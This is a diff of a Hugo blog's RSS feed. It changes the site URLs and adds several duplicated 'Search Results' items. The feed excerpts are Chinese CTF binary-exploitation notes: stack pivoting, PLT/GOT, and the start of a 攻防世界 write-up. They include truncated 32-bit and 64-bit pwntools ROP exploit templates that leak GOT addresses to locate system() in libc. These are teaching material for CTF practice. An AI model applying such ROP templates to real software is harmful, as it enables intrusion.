@@ -1,18 +1,187 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on Ssd&#39;s Blog</title>
-    <link>https://shaodongshi.github.io/posts/</link>
-    <description>Recent content in Posts on Ssd&#39;s Blog</description>
+    <title>Posts on Dong</title>
+    <link>https://hugo-toha.github.io/posts/</link>
+    <description>Recent content in Posts on Dong</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 18 Jul 2021 18:45:55 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 18 Jul 2021 18:45:55 +0800</lastBuildDate><atom:link href="https://hugo-toha.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Resultados de Búsqueda</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.
+No se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html
+Establecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.
+Esta implementación utiliza Fusejs, jquery y mark.js
+Configuración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>অনুসন্ধানের ফলাফল</title>
+      <link>https://hugo-toha.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://hugo-toha.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
     <item>
       <title>栈迁移原理</title>
-      <link>https://shaodongshi.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/</link>
+      <link>https://hugo-toha.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/</link>
       <pubDate>Sun, 18 Jul 2021 18:45:55 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/</guid>
+      <guid>https://hugo-toha.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/</guid>
       <description>栈迁移原理 0x1利用前提 1.存在栈溢出
 2.栈溢出可利用空间过小，无法写入较长的ROP链
 0x2主要利用点 leave; ret; #其中leave -&amp;gt;&amp;gt; mov esp,ebp; #	pop ebp; #其中ret -&amp;gt;&amp;gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：
@@ -32,28 +201,28 @@ read 函数执行完成以后程序返回到了 leave_ret，这样就会在执�
     
     <item>
       <title>64位栈溢出rop模板(无PIE)</title>
-      <link>https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
+      <link>https://hugo-toha.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
       <pubDate>Mon, 12 Jul 2021 17:35:19 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
+      <guid>https://hugo-toha.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
       <description>64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; #p = process(&amp;#34;./&amp;#34;) p = remote(&amp;#34;&amp;#34;,) elf = ELF(&amp;#34;./&amp;#34;) read_got = elf.got[&amp;#39;read&amp;#39;] puts_plt = elf.plt[&amp;#39;puts&amp;#39;] main_addr = pop_rdi = #************泄露got********* payload = b&amp;#39;a&amp;#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,&amp;#39;b&amp;#39;) p.sendline( payload) p.recvuntil(&amp;#39;&amp;#39;) read_addr = u64(p.recvuntil(&amp;#39;\x0a&amp;#39;)[:-1].ljust(8, &amp;#39;\x00&amp;#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&amp;#34;read&amp;#34;,read_addr) offset = read_addr - libc.dump(&amp;#34;read&amp;#34;) sys_addr = offset + libc.</description>
     </item>
     
     <item>
       <title>32位栈溢出rop模板</title>
-      <link>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
+      <link>https://hugo-toha.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</link>
       <pubDate>Sun, 11 Jul 2021 17:26:35 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
+      <guid>https://hugo-toha.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
       <description>32位栈溢出rop模板（无PIE） #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; process_name = &amp;#39;./&amp;#39; #p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;}) p = remote(&amp;#39;&amp;#39;, ) elf = ELF(process_name) #**************泄露got并寻找libc def send_payload(payload): payload = &amp;#39;A&amp;#39;*(偏移) + payload p.sendlineafter(&amp;#39;&amp;#39;, payload) main_addr = write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#34;write&amp;#34;] payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) send_payload(payload) write_addr = u32(p.recvn(4)) log.info(&amp;#34;write_addr =&amp;gt; %#x&amp;#34;, write_addr) libc = LibcSearcher(&amp;#39;write&amp;#39;, write_addr) libc_base = write_addr - libc.</description>
     </item>
     
     <item>
       <title>Plt与got</title>
-      <link>https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/</link>
+      <link>https://hugo-toha.github.io/posts/plt%E4%B8%8Egot/</link>
       <pubDate>Sun, 11 Jul 2021 15:07:02 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/plt%E4%B8%8Egot/</guid>
+      <guid>https://hugo-toha.github.io/posts/plt%E4%B8%8Egot/</guid>
       <description>plt与got理解 0x1 基础知识 .got GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。
 .plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址。
 .got.plt 这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。
@@ -66,10 +235,10 @@ read 函数执行完成以后程序返回到了 leave_ret，这样就会在执�
     
     <item>
       <title>攻防世界WP</title>
-      <link>https://shaodongshi.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</link>
+      <link>https://hugo-toha.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</link>
       <pubDate>Wed, 07 Jul 2021 18:14:33 +0800</pubDate>
       
-      <guid>https://shaodongshi.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</guid>
+      <guid>https://hugo-toha.github.io/posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/</guid>
       <description>攻防世界WP 新手区 题目 get shell 题目描述： 运行就能拿到shell呢，真的
 题目分析： nc链接，运行，拿到shell
 解题： 1.nc链接IP（端口是空格）
